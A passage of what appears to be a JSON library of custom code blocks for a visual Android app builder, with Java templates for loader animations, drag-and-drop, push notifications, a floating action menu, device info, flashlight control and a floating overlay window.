{\n\t\t\t\tprivate Arc[] arcs;\n\t\t\t\tprivate int numberOfArc;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic Whirlpool() {\n\t\t\t\t\tnumberOfArc \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\tarcs \u003d new Arc[numberOfArc];\n\t\t\t\t\trotates \u003d new float[numberOfArc];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfloat d \u003d r / 4 + i * r / 4;\n\t\t\t\t\t\tarcs[i] \u003d new Arc();\n\t\t\t\t\t\tarcs[i].setColor(color);\n\t\t\t\t\t\tarcs[i].setOval(new android.graphics.RectF(center.x - d, center.y - d, center.x + d, center.y + d));\n\t\t\t\t\t\tarcs[i].setStartAngle(i * 45);\n\t\t\t\t\t\tarcs[i].setSweepAngle(i * 45 + 90);\n\t\t\t\t\t\tarcs[i].setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\t\tarcs[i].setWidth(r / 10f);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d numberOfArc - 1; i \u003e\u003d 0; i--) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(arcs[i].getStartAngle(),\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   arcs[i].getStartAngle() + 360* (i %2$s 2 \u003d\u003d 0 ? -1 : 1));\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration((i + 1) * 500);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tarcs[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic class Worm extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int circlesSize;\n\t\t\t\tprivate float radius;\n\t\t\t\tprivate int[] transformations;\n\n\t\t\t\tpublic Worm() {\n\t\t\t\t\tcirclesSize \u003d 5;\n\t\t\t\t\ttransformations \u003d new int[]{-2, -1, 0, 1, 2};\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tcircles \u003d new Circle[circlesSize];\n\t\t\t\t\tradius \u003d width / 10f - width / 100f;\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(radius);\n\t\t\t\t\t\tcircles[i].setCenter(center.x, center.y);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\t\t\t\t\t\tandroid.animation.ValueAnimator translateAnimator \u003d android.animation.ValueAnimator.ofFloat(center.y, height / 4f, height * 3 / 4f, center.y);\n\t\t\t\t\t\ttranslateAnimator.setDuration(1000);\n\t\t\t\t\t\ttranslateAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\ttranslateAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\ttranslateAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tcircles[index].setCenter(center.x, (float)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\ttranslateAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.translate(2 * radius * transformations[i], 0);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic abstract class LoaderView {\n\t\t\t\tprotected int color;\n\t\t\t\tprotected int width, height;\n\t\t\t\tprotected int desiredWidth, desiredHeight;\n\t\t\t\tprotected PointF center;\n\t\t\t\tprotected InvalidateListener invalidateListener;\n\n\t\t\t\tpublic LoaderView() {\n\t\t\t\t\tthis.desiredWidth \u003d 150;\n\t\t\t\t\tthis.desiredHeight \u003d 150;\n\t\t\t\t}\n\n\t\t\t\tpublic void setColor(int color) {\n\t\t\t\t\tthis.color \u003d color;\n\t\t\t\t}\n\n\t\t\t\tpublic void setSize(int width, int height) {\n\t\t\t\t\tthis.width \u003d width;\n\t\t\t\t\tthis.height \u003d height;\n\t\t\t\t\tthis.center \u003d new PointF(width / 2.0f, height / 2.0f);\n\t\t\t\t}\n\n\t\t\t\tpublic void setInvalidateListener(InvalidateListener invalidateListener) {\n\t\t\t\t\tthis.invalidateListener \u003d invalidateListener;\n\t\t\t\t}\n\n\t\t\t\tpublic int getDesiredWidth() {\n\t\t\t\t\treturn desiredWidth;\n\t\t\t\t}\n\n\t\t\t\tpublic int getDesiredHeight() {\n\t\t\t\t\treturn desiredHeight;\n\t\t\t\t}\n\n\t\t\t\tpublic abstract void initializeObjects();\n\n\t\t\t\tpublic abstract void setUpAnimation();\n\n\t\t\t\tpublic abstract void draw(android.graphics.Canvas canvas);\n\n\t\t\t\tpublic boolean isDetached() {\n\t\t\t\t\treturn invalidateListener \u003d\u003d null;\n\t\t\t\t}\n\n\t\t\t\tpublic void onDetach() {\n\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\tinvalidateListener \u003d null;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic static class LoaderGenerator {\n\t\t\t\tpublic static LoaderView generateLoaderView(int type) {\n\t\t\t\t\t%1$s aan \u003d new %1$s();\n\t\t\t\t\tswitch (type) {\n\t\t\t\t\t\tcase 0:\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t\tcase 1:\n\t\t\t\t\t\t\treturn aan.new FishSpinner();\n\t\t\t\t\t\tcase 2:\n\t\t\t\t\t\t\treturn aan.new LineSpinner();\n\t\t\t\t\t\tcase 3:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(3);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 4:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(4);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 5:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(5);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 6:\n\t\t\t\t\t\t\treturn aan.new Radar();\n\t\t\t\t\t\tcase 7:\n\t\t\t\t\t\t\treturn aan.new TwinFishesSpinner();\n\t\t\t\t\t\tcase 8:\n\t\t\t\t\t\t\treturn aan.new Worm();\n\t\t\t\t\t\tcase 9:\n\t\t\t\t\t\t\treturn aan.new Whirlpool();\n\t\t\t\t\t\tcase 10:\n\t\t\t\t\t\t\treturn aan.new PhoneWave();\n\t\t\t\t\t\tcase 11:\n\t\t\t\t\t\t\treturn aan.new Sharingan();\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tpublic static LoaderView generateLoaderView(String type) {\n\t\t\t\t\t%1$s aan \u003d new %1$s();\n\t\t\t\t\tswitch (type) {\n\t\t\t\t\t\tcase \"ClassicSpinner\":\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t\tcase \"FishSpinner\":\n\t\t\t\t\t\t\treturn aan.new FishSpinner();\n\t\t\t\t\t\tcase \"LineSpinner\":\n\t\t\t\t\t\t\treturn aan.new LineSpinner();\n\t\t\t\t\t\tcase \"ThreePulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(3);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"FourPulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(4);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"FivePulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(5);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"Radar\":\n\t\t\t\t\t\t\treturn aan.new Radar();\n\t\t\t\t\t\tcase \"TwinFishesSpinner\":\n\t\t\t\t\t\t\treturn aan.new TwinFishesSpinner();\n\t\t\t\t\t\tcase \"Worm\":\n\t\t\t\t\t\t\treturn aan.new Worm();\n\t\t\t\t\t\tcase \"Whirlpool\":\n\t\t\t\t\t\t\treturn aan.new Whirlpool();\n\t\t\t\t\t\tcase \"PhoneWave\":\n\t\t\t\t\t\t\treturn aan.new PhoneWave();\n\t\t\t\t\t\tcase \"Sharingan\":\n\t\t\t\t\t\t\treturn aan.new Sharingan();\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class MKLoader extends View implements InvalidateListener {\n\t\t\t\tprivate int setLoaderType;\n\t\t\t\tprivate int setLoaderColor;\n\t\t\t\tprivate LoaderView loaderView;\n\n\t\t\t\tpublic MKLoader(Context context) {\n\t\t\t\t\tsuper(context);\n\t\t\t\t\tinitialize(context, null, 0);\n\t\t\t\t}\n\n\t\t\t\tpublic MKLoader(Context context, android.util.AttributeSet attrs) {\n\t\t\t\t\tsuper(context, attrs);\n\t\t\t\t\tinitialize(context, attrs, 0);\n\t\t\t\t}\n\n\t\t\t\tpublic MKLoader(Context context, android.util.AttributeSet attrs, int defStyleAttr) {\n\t\t\t\t\tsuper(context, attrs, defStyleAttr);\n\t\t\t\t\tinitialize(context, attrs, defStyleAttr);\n\t\t\t\t}\n\n\t\t\t\tprivate void initialize(Context context, android.util.AttributeSet attrs, int defStyleAttr) {\n\t\t\t\t\t//TypedArray typedArray \u003d context.obtainStyledAttributes(attrs, R.styleable.MKLoader);\n\t\t\t\t\t//int loaderType \u003d typedArray.getInt(R.styleable.MKLoader_mk_type,-1);\n\t\t\t\t\t//int loaderType \u003d -1;\n\t\t\t\t\t//loaderView \u003d LoaderGenerator.generateLoaderView(setLoaderType);\n\t\t\t\t\t//loaderView.setColor(Color.parseColor(\"#ffffff\"));\n\t\t\t\t\t//loaderView.setColor(typedArray.getColor(R.styleable.MKLoader_mk_color, Color.parseColor(\"#ffffff\")));\n\t\t\t\t\t//typedArray.recycle();\n\t\t\t\t}\n\n\t\t\t\tpublic void setType(int _type) {\n\t\t\t\t\tthis.setLoaderType \u003d _type;\n\t\t\t\t\tloaderView \u003d LoaderGenerator.generateLoaderView(setLoaderType);\n\t\t\t\t}\n\t\t\t\tpublic void setColor(int _color) {\n\t\t\t\t\tthis.setLoaderColor \u003d _color;\n\t\t\t\t\tloaderView.setColor(setLoaderColor);\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n\t\t\t\t\tfinal int measuredWidth \u003d resolveSize(loaderView.getDesiredWidth(), widthMeasureSpec);\n\t\t\t\t\tfinal int measuredHeight \u003d resolveSize(loaderView.getDesiredHeight(), heightMeasureSpec);\n\n\t\t\t\t\tsetMeasuredDimension(measuredWidth, measuredHeight);\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onLayout(boolean changed, int left, int top, int right, int bottom) {\n\t\t\t\t\tsuper.onLayout(changed, left, top, right, bottom);\n\t\t\t\t\tloaderView.setSize(getWidth(), getHeight());\n\t\t\t\t\tloaderView.initializeObjects();\n\t\t\t\t\tloaderView.setUpAnimation();\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onDraw(android.graphics.Canvas canvas) {\n\t\t\t\t\tsuper.onDraw(canvas);\n\t\t\t\t\tloaderView.draw(canvas);\n\t\t\t\t}\n\n\t\t\t\t@Override public void reDraw() {\n\t\t\t\t\tinvalidate();\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onAttachedToWindow() {\n\t\t\t\t\tsuper.onAttachedToWindow();\n\t\t\t\t\tif (loaderView !\u003d null \u0026\u0026 loaderView.isDetached()) {\n\t\t\t\t\t\tloaderView.setInvalidateListener(this);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onDetachedFromWindow() {\n\t\t\t\t\tsuper.onDetachedFromWindow();\n\t\t\t\t\tif (loaderView !\u003d null) {\n\t\t\t\t\t\tloaderView.onDetach();\n\t\t\t\t\t}\n\t\t\t\t}","color":"#CAC319","name":"MKLoaderLibrary","typeName":"","palette":"45","type":" ","spec":"\u003e\u003e\u003e\u003e\u003e %m.activity % %s.inputOnly MKLoaderLibrary \u003c\u003c\u003c\u003c"},{"code":"{final MKLoader ag \u003d new MKLoader(%2$s.this);\nag.setLayoutParams(new LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT));\nag.setType(%3$s); //0-11\nag.setColor(%4$s);\n%1$s.addView(ag);}","color":"#CAC319","name":"addMKLoader","typeName":"","palette":"45","type":" ","spec":"%m.view addMKLoader %m.activity type(0-11) %d  color %m.color"},{"code":"}public static class Dragger {\n    private View dragView;\n    private View[] targetViews;\n    private float dX, dY;\n    private int initXY[] \u003d new int[2];\n    private boolean isInitXy \u003d false;\n    private boolean eventSuccess \u003d false;\n    private DragEventListener dragEventListener;\n    private View view;\n    public Dragger(View dragView, View[] targetViews) {\n        this.dragView \u003d dragView;\n        this.targetViews \u003d targetViews;\n    }\n    public Dragger() {\n    }\n    public static Dragger create(){\n        return new Dragger();\n    }\n    public Dragger setDragView(View dragView) {\n        this.dragView \u003d dragView;\n        return this;\n    }\n    public Dragger setTargetViews(View[] targetViews) {\n        this.targetViews \u003d targetViews;\n        return this;\n    }\n    public Dragger setDragEventListener(DragEventListener dragEventListener) {\n        this.dragEventListener \u003d dragEventListener;\n        return this;\n    }\n    public void startDragging(){\n        if(dragView \u003d\u003d null){\n            return;\n        }\n        if(targetViews \u003d\u003d null){\n            return;\n        }\n        dragView.setOnTouchListener(new View.OnTouchListener() {\n            @Override\n            public boolean onTouch(View v, MotionEvent event) {\n                switch (event.getAction()) {\n                    case MotionEvent.ACTION_DOWN:\n                        dX \u003d dragView.getX() - event.getRawX();\n                        dY \u003d dragView.getY() - event.getRawY();\n                        if(!isInitXy) {\n                            dragView.getLocationInWindow(initXY);\n                            isInitXy \u003d true;\n                        }\n                        break;\n                    case MotionEvent.ACTION_MOVE:\n                        dragView.animate()\n                                .x(event.getRawX() + dX)\n                                .y(event.getRawY() + dY)\n                                .setDuration(0)\n                                .start();\n                        for(int i\u003d0;i\u003ctargetViews.length;i++) {\n                            if (isViewInBounds(targetViews[i], event.getRawX(), event.getRawY())) {\n                                Dragger.this.view \u003d targetViews[i];\n                                eventSuccess \u003d true;\n                                break;\n                            }\n                            else {\n                                eventSuccess \u003d false;\n                            }\n                        }\n                        break;\n                    case MotionEvent.ACTION_UP:\n                        if(!eventSuccess) {\n                            dragView.animate()\n                                    .x(initXY[0])\n                                    .y(initXY[1])\n                                    .setDuration(0)\n                                    .start();\n                        }else {\n                            if(dragEventListener !\u003d null)\n                                dragEventListener.onDragComplete(view);\n                        }\n                    default:\n                        return false;\n                }\n                return true;\n            }\n        });\n    }\n    private Rect rect \u003d new Rect();\n    private int[] location \u003d new int[2];\n    private boolean isViewInBounds(View target, float x, float y){\n        target.getDrawingRect(rect);\n        target.getLocationOnScreen(location);\n        rect.offset(location[0], location[1]);\n        return rect.contains((int) x, (int)y);\n    }\n    public interface DragEventListener{\n        public void onDragComplete(View targetView);\n    }\n","color":"#CAC319","name":"DraggerLibrary","typeName":"","palette":"46","type":" ","spec":"\u003e\u003e\u003e\u003e DraggerLibrary \u003c\u003c\u003c\u003c"},{"code":"Dragger.create().setDragView(%s)\n\t.setTargetViews(new View[]{%s})\n\t.setDragEventListener(new Dragger.DragEventListener() {\n\t@Override\n\tpublic void onDragComplete(View targetView) {\n%s\n\t}\n}).startDragging();","color":"#CAC319","name":"setDragView","typeName":"","palette":"46","type":"c","spec":"setDragView %m.view and setTargetViews%m.view  When onDragComplete"},{"code":"%s,%s","color":"#CAC319","name":"ViewAndView","typeName":"view","palette":"46","type":"p","spec":"%m.view and %m.view"},{"code":"targetView.equals(%s)","color":"#CAC319","name":"viewIsTargetView","typeName":"","palette":"46","type":"b","spec":"%m.view isTargetView"},{"code":"\t\t{final Activity activity \u003d %s.this;\n\t\tfinal Context context \u003d activity.getApplicationContext();\n\t\tfinal int notificationId \u003d %s;\n\t\tfinal String channelId \u003d %s;\n\t\tfinal String channelName \u003d %s;\n\t\t\n\t\tnew androidx.core.app.NotificationCompat.Builder(context, channelId){\n\t\t\t\n\t\t\t\n\t\t\tNotificationManager notificationManager \u003d (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);\n\t\t\tIntent intent335 \u003d new Intent();\n\t\t\t\t\t\t\t\t\t   public void create(){\n\n\t\t\t\t\t\t\t\t\t\t   intent335.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); \n\t\t\t\t\t\t\t\t\t\t   PendingIntent pendingIntent \u003d PendingIntent.getActivity(activity, 0, intent335, 0);\n\t\t\t\t\t\t\t\t\t\t   \n\t\t\t\t\t\t\t\t\t\t   if (android.os.Build.VERSION.SDK_INT \u003e\u003d android.os.Build.VERSION_CODES.O) {\n\t\t\t\t\t\t\t\t\t\t\t   NotificationChannel mChannel \u003d new NotificationChannel(\n\t\t\t\t\t\t\t\t\t\t\t\t   channelId, channelName, NotificationManager.IMPORTANCE_HIGH);\n\t\t\t\t\t\t\t\t\t\t\t   notificationManager.createNotificationChannel(mChannel);\n\t\t\t\t\t\t\t\t\t\t   }\n\t\t\t\t\t\t\t\t\t\n\n%s\n\n\t\t\t\t\t\t\t\t\t   }\n\n\t\t\t\t\t\t\t\t   }.create();}\n\t\t","color":"#8D75FF","name":"CreatePushNotification","typeName":"","palette":"47","type":"c","spec":"%m.activity CreatePushNotification id %d  channel id %s name %s"},{"code":"setSmallIcon(R.drawable.%s);","color":"#8D75FF","name":"pushNotificationSetSmallIcon","typeName":"","palette":"47","type":" ","spec":"pushNotification setSmallIcon %m.resource"},{"code":"setContentTitle(%s);","color":"#8D75FF","name":"pushNotificationSetTitle","typeName":"","palette":"47","type":" ","spec":"pushNotification setTitle %s"},{"code":"setContentText(%s);","color":"#8D75FF","name":"pushNotificationSetContentText","typeName":"","palette":"47","type":" ","spec":"pushNotification setContentText %s"},{"code":"\t\t\t\t\t\t\t\t\t\t   setAutoCancel(%s);","color":"#8D75FF","name":"pushNotificationSetAutoCancel","typeName":"","palette":"47","type":" ","spec":"pushNotification setAutoCancel %b"},{"code":"setOngoing(%s);","color":"#8D75FF","name":"pushNotificationSetOngoing","typeName":"","palette":"47","type":" ","spec":"pushNotification setOngoing %b"},{"code":"setColor(%s);","color":"#8D75FF","name":"pushNotificationSetColor","typeName":"","palette":"47","type":" ","spec":"pushNotification setColor %m.color"},{"code":"setTitleColor(%s);","color":"#8D75FF","name":"pushNotificationTitleSetColor","typeName":"","palette":"47","type":" ","spec":"pushNotification setTitleColor %m.color"},{"code":"setSound(android.net.Uri.parse(%s));","color":"#8D75FF","name":"pushNotificationSetSound","typeName":"","palette":"47","type":" ","spec":"pushNotification setSoundUri %s"},{"code":"setPriority(androidx.core.app.NotificationCompat.PRIORITY_DEFAULT);","color":"#8D75FF","name":"pushNotificationSetPriorityDEFAULT","typeName":"","palette":"47","type":" ","spec":"pushNotification setPriorityDEFAULT"},{"code":"setLights(%s,%s,%s);","color":"#8D75FF","name":"pushNotificationSetLights","typeName":"","palette":"47","type":" ","spec":"pushNotification setLights color %m.color start ms %d stop ms %d"},{"code":"setContentView(R.layout.%s);","color":"#8D75FF","name":"pushNotificationSetContentView","typeName":"","palette":"47","type":" ","spec":"pushNotification setContentView %m.customViews"},{"code":"%s \u003d findViewById(R.id.%s);","color":"#8D75FF","name":"pushNotificationWidgetFindViewById","typeName":"","palette":"47","type":" ","spec":"%s.inputOnly findViewById %s.inputOnly"},{"code":"RemoteViews contentView \u003d new RemoteViews(getPackageName(), R.layout.%s);\nsetContent(contentView);","color":"#8D75FF","name":"pushNotificationSetContentRemoteView","typeName":"","palette":"47","type":" ","spec":"pushNotification setContentRemoteView %m.customViews"},{"code":"contentView.setOnClickPendingIntent(R.id.%2$s,pendingIntent%1$s);","color":"#8D75FF","name":"pushNotificationFVBSetOnClick","typeName":"pandingIntent","palette":"47","type":" ","spec":"%m.pandingIntent FVB id %s.inputOnly setOnClick "},{"code":"%1$s.putExtra(%2$s,%3$s);","color":"#8D75FF","name":"pushNotificationPandingIntentPutExtra","typeName":"intent","palette":"47","type":" ","spec":"%m.intent putExtra key %s value %s"},{"code":"%1$s.setClass(getApplicationContext(),%2$s.class);\r\n","color":"#8D75FF","name":"pushNotificationPandingIntentSetScreen","typeName":"intent","palette":"47","type":" ","spec":"%m.intent setScreen %m.activity"},{"code":"setContentIntent(pendingIntent);\t\t\t\t\t\t\t\t   setContentIntent(TaskStackBuilder.create(context)\n\t\t\t\t\t\t\t\t\t\t   .addNextIntent(intent335).getPendingIntent(0,PendingIntent.FLAG_UPDATE_CURRENT));\n\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t","color":"#8D75FF","name":"pushNotificationSetPendingIntent","typeName":"","palette":"47","type":" ","spec":"pushNotification setDefaultPandingIntent"},{"code":"Intent %1$s \u003d new Intent(%2$s.this, %3$s.class);\nPendingIntent pendingIntent%1$s \u003d PendingIntent.getActivity(%2$s.this, 0, %1$s, 0);\n%1$s.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | %1$s.FLAG_ACTIVITY_CLEAR_TASK);","color":"#8D75FF","name":"pushNotificationCustomPandingIntentCreate","typeName":"","palette":"47","type":" ","spec":"pushNotification createPandingIntent %s.inputOnly this %m.activity goto %m.activity"},{"code":"%s","color":"#8D75FF","name":"pushNotificationCustomPendingIntent","typeName":"pandingIntent","palette":"47","type":"p","spec":"pandingIntent %s.inputOnly"},{"code":"intent335","color":"#8D75FF","name":"pushNotificationPendingIntent","typeName":"Intent","palette":"47","type":"p","spec":"defaultPandingIntent"},{"code":"notificationManager.notify(notificationId, this.build());","color":"#8D75FF","name":"pushNotificationShow","typeName":"","palette":"47","type":"f","spec":"pushNotification Show"},{"code":"ImageView icon91\u003dnew ImageView(%1$s.this); icon91.setImageResource(R.drawable.%2$s);\nfinal FloatingActionButton fab91 \u003dnew FloatingActionButton.Builder(%1$s.this).setContentView(icon91).build();\nSubActionButton.Builder builder91 \u003dnew SubActionButton.Builder(%1$s.this);","color":"#2FAFFF","name":"CreateFabIconCFAM","typeName":"","palette":"48","type":" ","spec":"%m.activity CFAM CreateFloatingActionButton %m.resource "},{"code":"ImageView %2$sIcon\u003dnew ImageView(%1$s.this); \n%2$sIcon.setImageResource(R.drawable.%3$s);\n        SubActionButton %2$sBtn\u003dbuilder91.setContentView(%2$sIcon).build();","color":"#2FAFFF","name":"CFAMCreateItem","typeName":"","palette":"48","type":" ","spec":"%m.activity CFAM CreateMenuItem %s.inputOnly icon %m.resource"},{"code":"final FloatingActionMenu fam91 \u003dnew FloatingActionMenu.Builder(%1$s.this).addSubActionView(%2$sBtn).attachTo(fab91).build();","color":"#2FAFFF","name":"CFAMBuildMenu","typeName":"","palette":"48","type":" ","spec":"%m.activity CFAM Build  addItem %m.MenuItem"},{"code":"%sBtn.setOnClickListener(new View.OnClickListener() {\n\t\t\t\t@Override\n\t\t\t\tpublic void onClick(View _view) {\n\t\t\t\t\t%s\n\nfam91.close(true);\n\t\t\t\t}\n\t\t\t});","color":"#2FAFFF","name":"FCAMOnItemOnClick","typeName":"","palette":"48","type":"c","spec":"FCAM when item %m.MenuItem onClick "},{"code":"%s","color":"#2FAFFF","name":"ActionMenuItem","typeName":"MenuItem","palette":"48","type":"p","spec":"MenuItem %s.inputOnly"},{"code":"%sBtn).addSubActionView(%s","color":"#2FAFFF","name":"ActionMenuItemAndMenuItem","typeName":"MenuItem","palette":"48","type":"p","spec":"MenuItem %m.MenuItem and MenuItem %m.MenuItem"},{"code":"//Version\n%1$s.setText(Build.VERSION.RELEASE);","name":"Version","palette":"52","type":" ","spec":"Version%m.textview"},{"code":"//Model\n%1$s.setText(Build.MANUFACTURER.concat(\" \".concat(Build.MODEL)));","name":"Model","palette":"52","type":" ","spec":"Model%m.textview"},{"code":"//Build Tags\n%1$s.setText(Build.TAGS);","name":"Build Tags","palette":"52","type":" ","spec":"Build Tags%m.textview"},{"code":"//Build User\n%1$s.setText(Build.USER);","name":"Build User","palette":"52","type":" ","spec":"Build User%m.textview"},{"code":"//Build Version SDK\n%1$s.setText(Build.VERSION.SDK);\n","name":"Build Version SDK","palette":"52","type":" ","spec":"Build Version SDK%m.textview"},{"code":"//Build ID\n%1$s.setText(Build.ID);","name":"Build ID","palette":"52","type":" ","spec":"Build ID%m.textview"},{"code":"android.hardware.camera2.CameraManager cameraManager \u003d (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);\ntry {\nString cameraId \u003d cameraManager.getCameraIdList()[0]; cameraManager.setTorchMode(cameraId, true); } catch (android.hardware.camera2.CameraAccessException e) { }","name":"Flashlight On","palette":"53","type":" ","spec":"Flashlight On"},{"code":"android.hardware.camera2.CameraManager cameraManager \u003d (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);\ntry {\nString cameraId \u003d cameraManager.getCameraIdList()[0]; cameraManager.setTorchMode(cameraId, false); } catch (android.hardware.camera2.CameraAccessException e) { }","name":"Flashlight Off","palette":"53","type":" ","spec":"Flashlight Off"},{"code":"final com.google.android.material.bottomsheet.BottomSheetDialog bs_base \u003d new com.google.android.material.bottomsheet.BottomSheetDialog(%1$s.this); bs_base.setCancelable(%2$s); View layBase \u003d getLayoutInflater().inflate(R.layout.%3$s, null); bs_base.setContentView(layBase); bs_base.show();","name":"BottomSheetDialog","palette":"54","type":" ","spec":"BottomSheetDialog on %m.activity setCancelable%b custom view%m.customViews"},{"code":"%s","color":"#34FFF4","name":"customView0","typeName":"customViews","palette":"54","type":"p","spec":"customView %s.inputOnly"},{"code":"%s","color":"#34FFF4","name":"customView0","typeName":"customViews","palette":"55","type":"p","spec":"customView %s.inputOnly"},{"code":"_reCall();\n\n}\nprivate WindowManager windowManager;\n\nprivate WindowManager.LayoutParams layoutParams;\n\nprivate View displayView;\n\nprivate void showFloatingWindow() {\n\nLayoutInflater layoutInflater \u003d LayoutInflater.from(this);\n\ndisplayView \u003d layoutInflater.inflate(R.layout.%s, null); displayView.setOnTouchListener(new FloatingOnTouchListener());\n\n%s\n\nwindowManager.addView(displayView, layoutParams);\n}\n\nprivate class FloatingOnTouchListener implements View.OnTouchListener { \nprivate int x;\nprivate int y;\n\n@Override public boolean onTouch(View view, MotionEvent event) {\n\nswitch (event.getAction()) { \ncase MotionEvent.ACTION_DOWN: \nx \u003d (int) event.getRawX(); \ny 